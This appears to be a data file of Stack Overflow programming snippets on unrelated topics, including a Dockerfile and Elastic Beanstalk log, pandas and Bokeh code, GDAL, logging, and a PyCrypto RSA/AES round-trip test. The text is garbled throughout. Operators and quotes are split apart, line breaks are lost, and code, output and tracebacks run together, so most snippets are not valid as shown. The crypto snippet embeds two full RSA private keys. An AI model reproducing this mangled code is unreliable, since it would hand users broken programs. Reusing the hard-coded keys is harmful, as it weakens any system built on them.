"FROM flux7/wp-site # This is the location of our docker container.RUN apt-get install supervisorRUN mkdir -p /var/log/supervisorADD supervisord.conf /etc/supervisor/conf.d/supervisord.confEXPOSE 80CMD supervisord -c /etc/supervisor/conf.d/supervisord.conf FROM ubuntu:14.04.2RUN rm /bin/sh & & ln -s /bin/bash /bin/shRUN apt-get -y update & & apt-get upgrade -yRUN apt-get install supervisor python build-essential python-dev python-pip python-setuptools -yRUN apt-get install libxml2-dev libxslt1-dev python-dev -yRUN apt-get install libpq-dev postgresql-common postgresql-client -yRUN apt-get install openssl openssl-blacklist openssl-blacklist-extra -yRUN apt-get install nginx -yRUN pip install `` pip > =7.0 '' RUN pip install virtualenv uwsgiRUN mkdir -p /var/log/supervisorADD canonicaliser_api /home/ubuntu/canonicaliser_apiADD config_local.py /home/ubuntu/canonicaliser_api/config/config_local.pyRUN virtualenv /home/ubuntu/canonicaliser_api/venvRUN source /home/ubuntu/canonicaliser_api/venv/bin/activate & & pip install -r /home/ubuntu/canonicaliser_api/requirements.txtRUN export CFLAGS=-I/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/numpy/core/include/RUN source /home/ubuntu/canonicaliser_api/venv/bin/activate & & cd /home/ubuntu/canonicaliser_api/canonicaliser/cython_extensions/ & & python setup.py build_ext -- inplaceRUN cp /home/ubuntu/canonicaliser_api/canonicaliser/cython_extensions/canonicaliser/cython_extensions/*.so /home/ubuntu/canonicaliser_api/canonicaliser/cython_extensionsRUN rm -rf /home/ubuntu/canonicaliser_api/canonicaliser/cython_extensions/canonicaliserRUN rm -r /home/ubuntu/canonicaliser_api/canonicaliser/cython_extensions/buildRUN mkdir /var/run/flask-uwsgiRUN chown -R www-data : www-data /var/run/flask-uwsgiRUN mkdir /var/log/flask-uwsgiADD flask-uwsgi.ini /etc/flask-uwsgi/ADD supervisord.conf /etc/supervisor/conf.d/supervisord.confEXPOSE 8888CMD [ `` /usr/bin/supervisord '' ] [ 2015-08-11T14:02:10.489Z ] INFO [ 1858 ] - [ CMD-Startup/StartupStage0/AppDeployPreHook/03build.sh ] : Activity execution failed , because : WARNING : Invalid auth configuration file Pulling repository houmie/canon time= '' 2015-08-11T14:02:08Z '' level= '' fatal '' msg= '' Error : image houmie/canon : latest not found '' Failed to pull Docker image houmie/canon : latest , retrying ... WARNING : Invalid auth configuration file { `` auths '' : { `` https : //index.docker.io/v1/ '' : { `` auth '' : `` xxxx '' , `` email '' : `` xxx @ gmail.com '' } } } { `` AWSEBDockerrunVersion '' : '' 1 '' , `` Authentication '' : { `` Bucket '' : '' dd-xxx-ir-01 '' , `` Key '' : '' docker/dockercfg '' } , `` Image '' : { `` Name '' : '' houmie/canon '' , `` Update '' : '' true '' } , `` Ports '' : [ { `` ContainerPort '' : '' 8888 '' } ] }"
a = b '' some string '' a.someCustomMethod ( )
"# ! /bin/pythondef insertionSort ( ar ) : newNo = ar [ -1 ] for i in range ( 0 , m-1 ) : if ( newNo < ar [ m-i-1 ] ) : ar [ m-i ] = ar [ m-i-1 ] for e in ar : print e , print '\n ' ar [ m-i-1 ] = newNo for f in ar : print f , m = input ( ) ar = [ int ( i ) for i in raw_input ( ) .strip ( ) .split ( ) ] insertionSort ( ar ) 2 4 6 8 8 2 4 6 6 8 2 4 4 6 8 2 3 4 6 8 2 4 6 8 82 4 6 6 82 4 4 6 82 3 4 6 8"
"[ 01 ] { 1,2 } @ [ a-f ] 0 @ a 0 @ b 0 @ c 0 @ d 0 @ e 0 @ f00 @ a 00 @ b 00 @ c 00 @ d 00 @ e 00 @ f01 @ a 01 @ b 01 @ c 01 @ d 01 @ e 01 @ f 1 @ a 1 @ b 1 @ c 1 @ d 1 @ e 1 @ f10 @ a 10 @ b 10 @ c 10 @ d 10 @ e 10 @ f11 @ a 11 @ b 11 @ c 11 @ d 11 @ e 11 @ f [ 01 ] { 1,2 } = function ( ) { return [ ' 0 ' , '00 ' , '01 ' , ' 1 ' , '10 ' , '11 ' ] ; } ; @ = function ( ) { return [ ' @ ' ] ; } ; [ a-f ] = function ( ) { return [ ' a ' , ' b ' , ' c ' , 'd ' , ' e ' , ' f ' ] ; } ; var _ = require ( 'underscore ' ) ; function cartesianProductOf ( ) { return _.reduce ( arguments , function ( a , b ) { return _.flatten ( _.map ( a , function ( x ) { return _.map ( b , function ( y ) { return x.concat ( [ y ] ) ; } ) ; } ) , true ) ; } , [ [ ] ] ) ; } ; var tokens = [ [ ' 0 ' , '00 ' , '01 ' , ' 1 ' , '10 ' , '11 ' ] , [ ' @ ' ] , [ ' a ' , ' b ' , ' c ' , 'd ' , ' e ' , ' f ' ] , ] ; var result = cartesianProductOf ( tokens [ 0 ] , tokens [ 1 ] , tokens [ 2 ] ) ; _.each ( result , function ( value , key ) { console.log ( value.join ( `` ) ) ; } ) ; function* alpha ( ) { yield ' a ' ; yield ' b ' ; yield ' c ' ; } function* numeric ( ) { yield ' 0 ' ; yield ' 1 ' ; } function* alphanumeric ( ) { yield* alpha ( ) + numeric ( ) ; // what 's the diff between yield and yield* ? } for ( var i of alphanumeric ( ) ) { console.log ( i ) ; } { `` type '' : ret.types.ROOT , `` stack '' : [ { `` type '' : ret.types.CHAR , `` value '' : 98 // b } , { `` type '' : ret.types.REPETITION , `` max '' : 3 , `` min '' : 3 , `` value '' : { `` type '' : ret.types.SET , `` not '' : false , `` set '' : [ { `` type '' : ret.types.RANGE , `` from '' : 97 , // a `` to '' : 122 // z } ] } } ] ] }"
"from urllib.request import urlopenimport lxml.htmlurl= '' http : //f10.eastmoney.com/f10_v2/FinanceAnalysis.aspx ? code=sz300059 '' material=urlopen ( url ) .read ( ) root=lxml.html.parse ( material ) set=root.xpath ( '//table [ @ id= '' BBMX_table '' ] //tr ' ) < li class= '' first current '' onclick= '' ChangeRptF10AssetStatement ( '30005902 ' , ' 8 ' , 'All ' , this , '' ) ; '' > < li class= '' '' onclick= '' ChangeRptF10AssetStatement ( '30005902 ' , ' 8 ' , 'Year ' , this , '' ) ; '' > import lxmlfrom selenium import webdriverfrom selenium.webdriver.chrome.options import Optionschrome_options = Options ( ) chrome_options.add_argument ( ' -- no-sandbox ' ) chrome_options.add_argument ( ' -- disable-dev-shm-usage ' ) chrome_options.add_argument ( `` -- headless '' ) browser = webdriver.Chrome ( options=chrome_options , executable_path='/usr/bin/chromedriver ' ) browser.get ( `` http : //f10.eastmoney.com/f10_v2/FinanceAnalysis.aspx ? code=sz300059 '' ) root = lxml.html.document_fromstring ( browser.page_source ) mystring = lxml.etree.tostring ( root , encoding = `` unicode '' ) with open ( `` /tmp/test.html '' , '' w '' ) as fh : fh.write ( mystring )"
"import numpy as npimport scipy.sparse def coord_transform_n ( r , alpha ) : `` '' '' alpha : the n-2 values between [ 0 , \pi ) and last one between [ 0,2\pi ) `` '' '' x= [ ] for i in range ( alpha.shape [ 0 ] ) : x.append ( r*np.prod ( np.sin ( alpha [ 0 : i ] ) ) *np.cos ( alpha [ i ] ) ) return np.asarray ( x ) print coord_transform_n ( 1 , np.asarray ( np.asarray ( [ 1,2 ] ) ) )"
"$ python rl.pyTraceback ( most recent call last ) : File `` rl.py '' , line 22 , in < module > from pybrain.rl.environments.mazes import Maze , MDPMazeTask File `` /Library/Python/2.7/site-packages/PyBrain-0.3.1-py2.7.egg/pybrain/rl/environments/mazes/__init__.py '' , line 3 , in < module > from pybrain.rl.environments.mazes.tasks.__init__ import * File `` /Library/Python/2.7/site-packages/PyBrain-0.3.1-py2.7.egg/pybrain/rl/environments/mazes/tasks/__init__.py '' , line 1 , in < module > from pybrain.rl.environments.mazes.tiger import TigerTaskImportError : No module named tiger"
"Driver : GTiff/GeoTIFFFiles : generated.tiff generated.tiff.aux.xmlSize is 6941 , 4886Coordinate System is ` 'GCP Projection = GEOGCS [ `` WGS 84 '' , DATUM [ `` WGS_1984 '' , SPHEROID [ `` WGS 84 '' ,6378137,298.257223563 , AUTHORITY [ `` EPSG '' , '' 7030 '' ] ] , AUTHORITY [ `` EPSG '' , '' 6326 '' ] ] , PRIMEM [ `` Greenwich '' ,0 ] , UNIT [ `` degree '' ,0.0174532925199433 ] , AUTHORITY [ `` EPSG '' , '' 4326 '' ] ] GCP [ 0 ] : Id=1 , Info= ( 0,0 ) - > ( 0.01,0.05886,0 ) GCP [ 1 ] : Id=2 , Info= ( 6941,0 ) - > ( 0.07941,0.05886,0 ) GCP [ 2 ] : Id=3 , Info= ( 6941,4886 ) - > ( 0.07941,0.01,0 ) GCP [ 3 ] : Id=4 , Info= ( 0,4886 ) - > ( 0.01,0.01,0 ) Metadata : AREA_OR_POINT=Area Software=paint.net 4.0Image Structure Metadata : INTERLEAVE=BANDCorner Coordinates : Upper Left ( 0.0 , 0.0 ) Lower Left ( 0.0 , 4886.0 ) Upper Right ( 6941.0 , 0.0 ) Lower Right ( 6941.0 , 4886.0 ) Center ( 3470.5 , 2443.0 ) import gdalgdal.UseExceptions ( ) s = gdal.Open ( 'generated.tiff ' ) drv = gdal.GetDriverByName ( `` VRT '' ) vrt = drv.CreateCopy ( 'test.vrt ' , s , 0 ) band = vrt.GetRasterBand ( 1 ) source_path = 'marker1.png'source_band = 1x_size = 36y_size = 60x_block = 36y_block = 1x_offset = 0y_offset = 0x_source_size = 36y_source_size = 60dest_x_offset = 2000dest_y_offset = 2000x_dest_size = 36y_dest_size = 60simple_source = ' < SimpleSource > < SourceFilename relativeToVRT= '' 1 '' > % s < /SourceFilename > ' % source_path + \ ' < SourceBand > % i < /SourceBand > ' % source_band + \ ' < SourceProperties RasterXSize= '' % i '' RasterYSize= '' % i '' DataType= '' Byte '' BlockXSize= '' % i '' BlockYSize= '' % i '' / > ' % ( x_size , y_size , x_block , y_block ) + \ ' < SrcRect xOff= '' % i '' yOff= '' % i '' xSize= '' % i '' ySize= '' % i '' / > ' % ( x_offset , y_offset , x_source_size , y_source_size ) + \ ' < DstRect xOff= '' % i '' yOff= '' % i '' xSize= '' % i '' ySize= '' % i '' / > < /SimpleSource > ' % ( dest_x_offset , dest_y_offset , x_dest_size , y_dest_size ) band.SetMetadata ( { 'source_0 ' : simple_source } , `` new_vrt_sources '' ) band.SetMetadataItem ( `` NoDataValue '' , ' 1 ' ) p = gdal.GetDriverByName ( `` PNG '' ) p.CreateCopy ( 'result.png ' , vrt , 0 ) vrt = None"
"class FormBase ( FormView ) : def form_valid ( self , form ) : # push to google analytics # _gaq.push ( [ '_setAccount ' , 'UA-12345-1 ' ] ) ; # _gaq.push ( [ '_trackPageview ' , '/home/landingPage ' ] ) ; return super ( FormBase , self ) .form_valid ( form )"
df.index.name = 'foo '
"class Projectile ( Movable , Rotatable , Bounded ) : `` ' A projectile . ' '' def __init__ ( self , bounds , position= ( 0 , 0 ) , heading=0.0 ) : Movable.__init__ ( self ) Rotatable.__init__ ( self , heading ) Bounded.__init__ ( self , bounds ) self.position = Vector ( position ) def update ( self , dt=1.0 ) : `` 'Update the state of the object . ' '' scalar = self.velocity heading = math.radians ( self.heading ) direction = Vector ( [ math.sin ( heading ) , math.cos ( heading ) ] ) self.position += scalar * dt * direction Bounded.update ( self ) class Bounded ( object ) : `` ' A mix-in for bounded objects . ' '' def __init__ ( self , bounds ) : self.bounds = bounds def update ( self ) : if not self.bounds.contains ( self.rect ) : while self.rect.top > self.bounds.top : self.rect.centery += 1 while self.rect.bottom < self.bounds.bottom : self.rect.centery += 1 while self.rect.left < self.bounds.left : self.rect.centerx += 1 while self.rect.right > self.bounds.right : self.rect.centerx -= 1"
"attempts : 1000 success : 0mismatch : 0 fail : 1000 Bad signature = 993 Ciphertext too large = 7 attempts : 1000 success : 673mismatch : 0 fail : 327 AES key must be either 16 , 24 , or 32 bytes long = 3 Ciphertext too large = 324 attempts : 1000 success : 993mismatch : 0 fail : 7 AES key must be either 16 , 24 , or 32 bytes long = 3 Bad signature = 4 attempts : 1000 success : 994mismatch : 0 fail : 6 AES key must be either 16 , 24 , or 32 bytes long = 6 from Crypto import Randomfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytes , bytes_to_longfrom base64 import b64encode , b64decoderng = Random.new ( ) .read # openssl genrsa -out alice.rsa 1024alice_private_key = RSA.importKey ( `` ' -- -- -BEGIN RSA PRIVATE KEY -- -- -MIICXAIBAAKBgQDcWasedZQPkg+//IrJbn/ndn0msT999kejgO0w3mzWSS66Rk3oNab/pjWFFp9t6hBlFuERCyyqjwFbqrk0fPeLJBsKQ3TOxDTXdLd50nIPZFgbBmtPkhKTd7tydB6GacMsLqrwI7IlJZcD7ts2quBTNgQAonkr2FJaWyJtTbb95QIDAQABAoGAbnIffD/w+7D5ZgCeTAKv54OTjV5QdcGI/OI1gUYrhWjfHAz7JcYms4NK1i+Vr9EfcJv8Kb/RHphZVOoItM9if5Rvaf890r4T+MUUZbl4E7LwEWBuASe6RPyI8DaouTOomFlKDjT5VbcBx+WOD+upmrjAwcolyLVulQ5g9Z59pW0CQQDybUKrz4EVzKMxrpAx0gIzkvNpe/4gxXBueyWqUTASiSwojyZFY6g25KVMuW16fSsRStptm6NpumxBXVojid7nAkEA6K/7VZd2eMq0O/MP2LT1n6dzx7130Y1g9HWbjsLTRWevGYytcD0OldebQxgCbLftuvkcpRtbmIjOsbji4dRfUwJBAJiQolC1+irZ6iouDZkM7U2/wWg1HC1LlAIzhfS1u2cu5Jdx30fz+7zwEAdE+t0HQL9VODmapTC4ncBVG5EaBykCQB0L4s8DckmP3EHjjKXbqRG+AIj9kNh60pCRodKHZYIzeDszQW9SX+C6omoUtDDIIQgHEtlVefCnm026K7BPJ3sCQAdhylJJ/ePSiY9QriPG/KTZR2aprF8eM1UrRebH2S0S4hZZmqYH/T/akHVxPsyuqyzoZGbVj6kauRhWbBLmpWk= -- -- -END RSA PRIVATE KEY -- -- - '' '.strip ( ) ) # openssl rsa -in alice.rsa -out alice.pub -puboutalice_public_key = RSA.importKey ( `` ' -- -- -BEGIN PUBLIC KEY -- -- -MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDcWasedZQPkg+//IrJbn/ndn0msT999kejgO0w3mzWSS66Rk3oNab/pjWFFp9t6hBlFuERCyyqjwFbqrk0fPeLJBsKQ3TOxDTXdLd50nIPZFgbBmtPkhKTd7tydB6GacMsLqrwI7IlJZcD7ts2quBTNgQAonkr2FJaWyJtTbb95QIDAQAB -- -- -END PUBLIC KEY -- -- - '' '.strip ( ) ) # openssl genrsa -out bob.rsa 1024bob_private_key = RSA.importKey ( `` ' -- -- -BEGIN RSA PRIVATE KEY -- -- -MIICXwIBAAKBgQDddMPxMRIe34mNYbldimaZ1j4Zw/kqPHkOfbzBhp3XR254eSQONe9DgaLQhw16n4o3FFP8aijlotw/LUfKosEldmiCFuZdTiMP/49a5CbQ/End+Z38tHIzmGv7qjtkU7K8Eu/J5/y3wqBNAkfejC4j8MNxg8eBBGTq8okra8in8wIDAQABAoGBAKmueSAKME81iiipMyWoEPtYe9a0IOsq0Lq4vvMtmS1FTzDB6U12J/D6mGzcvggxy+5uBfgGw3VINye1IyfxUrlbD0iycMY0dZUgm0QetOOnv8ip/cSKpAilvK+BH4q9ES0L2M/XOZoFgSmg58HS9UJfcXz95un8WRxSvn26lH3BAkEA/VZoZmTJ5W5fNwqxbWmOokRn+hBOl1hOvCDbRjuMKWNdQSFSmsQtjbGorNYfT4qrL4SxPbE3ogAePw9zxHbWkwJBAN/IlQtCfncEZ/3wYCS2DxEbO5NPEBTUQgOGzauQ4/lzU5k73gXLZiHZYdwNUPY359k+E26AAEBG5A+riI1VZSECQQCYR7Jlqjv6H4g4a8MPQ54rR/dAR0EWlExvpUhpRS4RStspZUBkK3w+agY8LlGP3Ijd/WMU9Eu+o1eLDFzIQa7lAkEAkViwJV4M0bSU7oRfjbiJ1KyBZ04kvcKXFb9KejJjP7O+Cnqt28meDkIoo0oq2aC5/4moCU8t2pGwstTQnitmwQJBAPSIOKujoLp23e4KCbB8ax9meY+2jaWTtf5FPpSVtHs1WhlITxCowbjF+aWGsypitdT596cHFKAV0Om89vf6R0U= -- -- -END RSA PRIVATE KEY -- -- - '' '.strip ( ) ) # openssl rsa -in bob.rsa -out bob.pub -puboutbob_public_key = RSA.importKey ( `` ' -- -- -BEGIN PUBLIC KEY -- -- -MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDddMPxMRIe34mNYbldimaZ1j4Zw/kqPHkOfbzBhp3XR254eSQONe9DgaLQhw16n4o3FFP8aijlotw/LUfKosEldmiCFuZdTiMP/49a5CbQ/End+Z38tHIzmGv7qjtkU7K8Eu/J5/y3wqBNAkfejC4j8MNxg8eBBGTq8okra8in8wIDAQAB -- -- -END PUBLIC KEY -- -- - '' '.strip ( ) ) # Alternate keys ( uncomment for PyCrypto keys ) # alice_private_key = RSA.generate ( 1024 , rng ) # alice_public_key = alice_private_key.publickey ( ) # bob_private_key = RSA.generate ( 1024 , rng ) # bob_public_key = bob_private_key.publickey ( ) def generate ( data , signature_key , encryption_key ) : # Generate encrypted data symmetric_key = rng ( 16 ) symmetric_cipher = AES.new ( symmetric_key ) padded_data = data + ( ' ' * ( 16 - divmod ( len ( data ) , 16 ) [ 1 ] ) ) encrypted_data = bytes ( symmetric_cipher.encrypt ( padded_data ) ) # Encrypt the symmetric key encrypted_key = bytes ( encryption_key.encrypt ( symmetric_key , None ) [ 0 ] ) # Sign the encrypted key signature = long_to_bytes ( signature_key.sign ( encrypted_key , None ) [ 0 ] ) return encrypted_key , signature , encrypted_datadef validate ( encrypted_key , signature , encrypted_data , verification_key , decryption_key ) : # Verify the signature if not verification_key.verify ( encrypted_key , ( bytes_to_long ( signature ) , ) ) : raise Exception ( `` Bad signature '' ) # Decrypt the key symmetric_key = decryption_key.decrypt ( ( encrypted_key , ) ) # Decrypt the data symmetric_cipher = AES.new ( symmetric_key ) return symmetric_cipher.decrypt ( encrypted_data ) .strip ( ) def test ( ) : attempts = 1000 success = 0 mismatch = 0 fail = 0 causes = { } for _ in range ( attempts ) : data = b64encode ( Random.new ( ) .read ( 16 ) ) try : encrypted_key , signature , encrypted_data = \ generate ( data , alice_private_key , bob_public_key ) result = validate ( encrypted_key , signature , encrypted_data , alice_public_key , bob_private_key ) if result == data : success += 1 else : mismatch += 1 except Exception as e : fail += 1 reason = str ( e ) if reason in causes : causes [ reason ] += 1 else : causes [ reason ] = 1 print ( `` attempts : % d '' % attempts ) print ( `` success : % d '' % success ) print ( `` mismatch : % d '' % mismatch ) print ( `` fail : % d '' % fail ) for cause , count in causes.items ( ) : print ( `` % s = % d '' % ( cause , count ) ) test ( )"
"{ u'description ' : u'sometext ' , u'boundingPoly ' : { u'vertices ' : [ { u ' x ' : 5595 } , { u ' x ' : 5717 } , { u ' y ' : 122 , u ' x ' : 5717 } , { u ' y ' : 122 , u ' x ' : 5595 }"
"values = [ 1 , 1 , 1 ] dates = pd.to_datetime ( np.repeat ( '2018-03-06 ' , 3 ) ) df = pd.DataFrame ( { 'value ' : values } , index=dates ) df.resample ( ' W-MON ' ) .size ( ) 2018-03-12 3Freq : W-MON , dtype : int64"
"log_file = open ( `` log_aug_19.txt '' , `` w '' ) console_error = ' ... stuff ... ' # the real code generates it with regexlog_file.write ( f ' { console_error= } ' )"
"TextField : plain text HtmlField : HTML formatted text AtomField : a string which is treated as a single token NumberField : a numeric value ( either float or integer ) DateField : a date with no time component GeoField : a locale based on latitude and longitude tags = ndb.StringProperty ( repeated=True ) t = '|'.join ( tags ) search.TextField ( name=cls.TAGS , value=t )"
"unsorted_dict = { 'potato ' : 'whatever1 ' , 'tomato ' : 'whatever2 ' , 'sandwich ' : 'whatever3 ' } ordination = [ 'sandwich ' , 'potato ' , 'tomato ' ] sorted_dict = { 'sandwich ' : 'whatever3 ' , 'potato ' : 'whatever1 ' , 'tomato ' : 'whatever2 ' }"
"> > > a d b > > > b a c > > > c b d > > > d c a for e in L : print ( e , letter_before_e , letter_after_e"
> > > a = `` zzzzqqqqasdfasdf1234 '' > > > b = `` zzzzqqqqasdfasdf1234 '' > > > id ( a ) 4402117560 > > > id ( b ) 4402117560 > > > c = `` ! @ # $ '' > > > d = `` ! @ # $ '' > > > id ( c ) == id ( d ) False > > > id ( a ) == id ( b ) True
"Could not find a version that satisfies the requirement django==0.96 ( from versions : 1.1.3 , 1.1.4 , 1.2.1 , 1.2.2 , 1.2.3 , 1.2.4 , 1.2.5 , 1.2.6 , 1.2.7 , 1.2 , 1.3.1 , 1.3.2 , 1.3.3 , 1.3.4 , 1.3.5 , 1.3.6 , 1.3.7 , 1.3 , 1.4.1 , 1.4.2 , 1.4.3 , 1.4.4 , 1.4.5 , 1.4.6 , 1.4.7 , 1.4.8 , 1.4 , 1.5.1 , 1.5.2 , 1.5.3 , 1.5.4 , 1.5 )"
"total_SO_questions_asked = 1print `` I have asked '' , total_SO_questions_asked , `` question to SO thus far . '' $ python example.pyI have asked 1 question to SO thus far ."
TransactionId Delta 14 2 14 3 14 1 14 2 15 4 15 2 15 3 TransactionId Delta Cumulative 14 2 2 14 3 5 14 1 6 14 2 8 15 4 4 15 2 6 15 3 9 c1 = df.TransactionId.eq ( df.TransactionId.shift ( ) )
"data = [ ] try : print data [ 0 ] except IndexError as error : print error.message $ python -W always test.pytest.py:5 : DeprecationWarning : BaseException.message has been deprecated as of Python 2.6 print error.messagelist index out of range $ cat test.pymy_dict = { } print my_dict.has_key ( 'test ' ) $ pep8 test.pytest.py:2:14 : W601 .has_key ( ) is deprecated , use 'in '"
"Type Tfulldata = Record dpoints , dloops : integer ; dtime , bT , sT , hI , LI : real ; tm : real ; data : array [ 1..armax ] Of Real ; End ; ... Var : fh : File Of Tfulldata ;"
def coolfunc ( s ) : return s + ' is cool ' app.jinja_env.globals.update ( coolfunc=coolfunc ) app.jinja_env.filters [ 'coolfunc ' ] = coolfunc { { coolfunc ( member.name ) } } { { member.name | coolfunc } } John is coolJohn is cool
"X_train = # training dataY_train = # target variablesbest_neighbors = # number of neighbors which gave highest score ( 3 ) idx = len ( X_train ) /5000scores = pd.DataFrame ( np.zeros ( ( idx+1 , 2 ) ) , index=np.arange ( 1 , len ( X_train ) , 5000 ) , columns= [ 'Train Score ' , 'CV Score ' ] ) for i in range ( 1 , len ( X_train ) , 5000 ) : X_train_set = X_train [ : i ] Y_train_set = Y_train [ : i ] neigh = KNeighborsClassifier ( n_neighbors = best_neigbors ) neigh.fit ( X_train_set , Y_train_set ) train_score = neigh.score ( X_train , Y_train ) cv_score = neigh.score ( X_test , Y_test ) scores [ 'Train Score ' ] [ i ] = train_score scores [ 'CV Score ' ] [ i ] = cv_score ValueError Traceback ( most recent call last ) < ipython-input-6-95e645e75971 > in < module > ( ) 10 neigh.fit ( X_train_set , Y_train_set ) 11 -- - > 12 train_score = neigh.score ( X_train , Y_train ) 13 cv_score = neigh.score ( X_test , Y_test ) 14 //anaconda/lib/python2.7/site-packages/sklearn/base.pyc in score ( self , X , y , sample_weight ) 289 `` '' '' 290 from .metrics import accuracy_score -- > 291 return accuracy_score ( y , self.predict ( X ) , sample_weight=sample_weight ) 292 293 //anaconda/lib/python2.7/site-packages/sklearn/neighbors/classification.pyc in predict ( self , X ) 145 X = atleast2d_or_csr ( X ) 146 -- > 147 neigh_dist , neigh_ind = self.kneighbors ( X ) 148 149 classes_ = self.classes_//anaconda/lib/python2.7/site-packages/sklearn/neighbors/base.pyc in kneighbors ( self , X , n_neighbors , return_distance ) 316 **self.effective_metric_params_ ) 317 -- > 318 neigh_ind = argpartition ( dist , n_neighbors - 1 , axis=1 ) 319 neigh_ind = neigh_ind [ : , : n_neighbors ] 320 # argpartition does n't guarantee sorted order , so we sort again//anaconda/lib/python2.7/site-packages/numpy/core/fromnumeric.pyc in argpartition ( a , kth , axis , kind , order ) 689 except AttributeError : 690 return _wrapit ( a , 'argpartition ' , kth , axis , kind , order ) -- > 691 return argpartition ( kth , axis , kind=kind , order=order ) 692 693 ValueError : kth ( =2 ) out of bounds ( 1 ) ValueError Traceback ( most recent call last ) < ipython-input-66-21f434a289fc > in < module > ( ) 10 neigh.fit ( X_train_set , Y_train_set ) 11 -- - > 12 train_score = neigh.score ( X_train , Y_train ) 13 cv_score = neigh.score ( X_test , Y_test ) 14 //anaconda/lib/python2.7/site-packages/sklearn/base.pyc in score ( self , X , y , sample_weight ) 293 `` '' '' 294 from .metrics import accuracy_score -- > 295 return accuracy_score ( y , self.predict ( X ) , sample_weight=sample_weight ) 296 297 //anaconda/lib/python2.7/site-packages/sklearn/neighbors/classification.pyc in predict ( self , X ) 136 X = check_array ( X , accept_sparse='csr ' ) 137 -- > 138 neigh_dist , neigh_ind = self.kneighbors ( X ) 139 140 classes_ = self.classes_//anaconda/lib/python2.7/site-packages/sklearn/neighbors/base.pyc in kneighbors ( self , X , n_neighbors , return_distance ) 337 raise ValueError ( 338 `` Expected n_neighbors < = % d . Got % d '' % -- > 339 ( train_size , n_neighbors ) 340 ) 341 n_samples , _ = X.shapeValueError : Expected n_neighbors < = 1 . Got 3"
"abspath = `` C : \Python32\Projects\ls.py '' abspath = abspath.split ( '\\ ' ) print ( abspath ) # this prints [ ' C : ' , 'Python32 ' , 'Projects ' , 'ls.py ' ] if ( options.mFlag ) : print ( os.path.join ( *abspath ) ) # this prints C : Python32\Projects\ls.py m = time.ctime ( os.path.getmtime ( os.path.join ( *abspath ) ) ) # this throws an exception"
"if sys.maxsize > 2**32 : print '64'else : print '32'64 > python -c `` import sys ; if sys.maxsize > 2**32 : print '64 ' else : print '32 ' ; '' File `` < string > '' , line 1 import sys ; if sys.maxsize > 2**32 : print '64 ' else : print '32 ' ; ^SyntaxError : invalid syntax"
________________________| || || my python script || || | -- -- -- -- -- -- -- -- -- -- -- -- | || python interpreter | -- -- -- -- -- -- -- -- -- -- -- --
A|N|N|NA|N|N|NA|N|N|NA|A|A|A if ( figi-1 ) % 7 ! = 0 : ax.set_yticklabels ( [ ] ) if figi < 29 : ax1.set_xticklabels ( [ ] ) nwide = 12nhigh = 5 if ( figi-1 ) % nwide ! = 0 : ax.set_yticklabels ( [ ] ) if figi < ( nwide*nhigh ) - nwide : ax.set_xticklabels ( [ ] )
"def proof_of_work ( b , nBytes ) : nonce = 0 # while the first nBytes of hash ( b + nonce ) are not 0 while sha256 ( b + uint2bytes ( nonce ) ) [ : nBytes ] ! = bytes ( nBytes ) : nonce = nonce + 1 return nonce def proof_of_work ( b , nBytes , num_of_cpus_running , this_cpu_id ) : nonce = this_cpu_id while sha256 ( b + uint2bytes ( nonce ) ) [ : nBytes ] ! = bytes ( nBytes ) : nonce = nonce + num_of_cpus_running return nonce core 0 : 0 , 4 , 8 , 16 , 32 ... core 1 : 1 , 5 , 9 , 17 , 33 ... core 2 : 2 , 6 , 10 , 18 , 34 ... core 3 : 3 , 7 , 15 , 31 , 38 ..."
< div id= '' whatever '' > < a href= '' unwanted link '' > < /a > < a href= '' unwanted link '' > < /a > ... < code > blah blah < /code > ... < a href= '' interesting link '' > < /a > < a href= '' interesting link '' > < /a > ... < /div >
class myClass ( ) : stuff def __init__ ( ) : do stuff def b ( ) : also do stuff def c ( ) : do other stuff def a ( ) : do even more stuff class myClass ( ) : stuff def __init__ ( ) : do stuff def a ( ) : do even more stuff def b ( ) : also do stuff def c ( ) : do other stuff
"from bokeh.plotting import figure , ColumnDataSourcefrom bokeh.models import CustomJS , HoverToolfrom bokeh.io import curdocs = ColumnDataSource ( data=dict ( x= [ 0 , 1 ] , y= [ 0 , 1 ] ) ) callback = CustomJS ( args=dict ( s=s ) , code= '' '' '' var geometry = cb_data [ 'geometry ' ] ; var mouse_x = geometry.x ; var mouse_y = geometry.y ; var x = s.get ( 'data ' ) [ ' x ' ] ; var y = s.get ( 'data ' ) [ ' y ' ] ; x [ 0 ] = mouse_x ; y [ 0 ] = mouse_y ; s.trigger ( 'change ' ) ; `` '' '' ) hover_tool = HoverTool ( callback=callback ) p = figure ( x_range= ( 0 , 1 ) , y_range= ( 0 , 1 ) , tools= [ hover_tool ] ) p.circle ( x= ' x ' , y= ' y ' , source=s ) def update ( ) : print s.datacurdoc ( ) .add_root ( p ) curdoc ( ) .add_periodic_callback ( update , 1000 ) from bokeh.plotting import figurefrom bokeh.io import curdocfrom bokeh.models.tools import BoxSelectTool , TapTool , HoverTool , LassoSelectToolfrom bokeh.models.ranges import Range1dTOOLS = [ TapTool ( ) , LassoSelectTool ( ) , BoxSelectTool ( ) , HoverTool ( ) ] p = figure ( tools=TOOLS , x_range=Range1d ( start=0.0 , end=10.0 ) , y_range=Range1d ( start=0.0 , end=10.0 ) ) def tool_events_callback ( attr , old , new ) : print attr , 'callback ' , newp.tool_events.on_change ( 'geometries ' , tool_events_callback ) curdoc ( ) .add_root ( p )"
"import loggingimport sysclass ConsoleFormatter ( logging.Formatter ) : def formatException ( self , exc_info ) : # Ugly but obvious way to see who 's talking . return `` CONSOLE EXCEPTION % s : % s '' % exc_info [ :2 ] def setup ( path ) : logger = logging.getLogger ( ) # file_handler = logging.FileHandler ( path , mode= ' w ' ) if __debug__ : file_handler.setLevel ( logging.DEBUG ) else : file_handler.setLevel ( logging.INFO ) formatter = logging.Formatter ( `` % ( asctime ) s % ( levelname ) -8s `` `` % ( name ) -16s % ( message ) s `` `` [ % ( filename ) s @ % ( lineno ) d in % ( funcName ) s ] '' ) file_handler.setFormatter ( formatter ) # console_handler = logging.StreamHandler ( sys.stderr ) console_handler.setLevel ( logging.INFO ) console_formatter = ConsoleFormatter ( `` % ( levelname ) -8s - % ( message ) s '' ) console_handler.setFormatter ( console_formatter ) # > > > FUN HAPPENS HERE < < < # Only the formatter of the first handler is used ! Both on the console # and in the file . Change the order of these two lines to see . logger.addHandler ( console_handler ) logger.addHandler ( file_handler ) # # 